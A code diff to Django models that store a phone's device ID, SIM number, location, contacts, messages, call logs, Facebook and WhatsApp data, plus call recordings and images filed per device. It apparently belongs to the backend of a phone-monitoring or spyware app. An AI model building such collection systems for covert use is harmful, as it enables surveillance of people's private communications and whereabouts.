@@ -14,19 +14,35 @@ class User(models.Model):
 
 
 class Phonedata(models.Model):
-    email = models.CharField(max_length=255)
-    devicename = models.CharField(max_length=255)
-    deviceid = models.CharField(max_length=255)
-    simnumber = models.CharField(max_length=255)
-    latitude = models.CharField(max_length=255)
-    longitude = models.CharField(max_length=255)
-    time = models.CharField(max_length=255)
-    contact = models.TextField(blank=True)
-    message = models.TextField(blank=True)
-    incomming = models.TextField(blank=True)
-    outgoing = models.TextField(blank=True)
-    facebook = models.TextField(blank=True)
-    whatsapp = models.TextField(blank=True)
+    email = models.CharField(max_length=255,blank=True,null=True)
+    devicename = models.CharField(max_length=255,blank=True,null=True)
+    deviceid = models.CharField(max_length=255,blank=True,null=True)
+    simnumber = models.CharField(max_length=255,blank=True,null=True)
+    latitude = models.CharField(max_length=255,blank=True,null=True)
+    longitude = models.CharField(max_length=255,blank=True,null=True)
+    time = models.CharField(max_length=255,blank=True,null=True)
+    contact = models.TextField(blank=True,null=True)
+    message = models.TextField(blank=True,null=True)
+    calllogs = models.TextField(blank=True,null=True)
+    facebook = models.TextField(blank=True,null=True)
+    whatsapp = models.TextField(blank=True,null=True)
 
     def __str__(self):
         return self.devicename
+
+class Audio(models.Model):
+    def deviceAudio(instance, filename):
+        return '/'.join(['CallRecoding',str(instance.deviceid),filename])
+    deviceid = models.CharField(max_length=255,blank=True,null=True);
+    callrecoding = models.FileField(upload_to=deviceAudio)
+    def __str__(self):
+        return str(self.callrecoding)
+
+
+class Image(models.Model):
+    def deviceimage(instance, filename):
+        return '/'.join(['Images',str(instance.deviceid),filename])
+    deviceid = models.CharField(max_length=255,blank=True,null=True);
+    image = models.ImageField(upload_to=deviceimage)
+    def __str__(self):
+        return str(self.image)
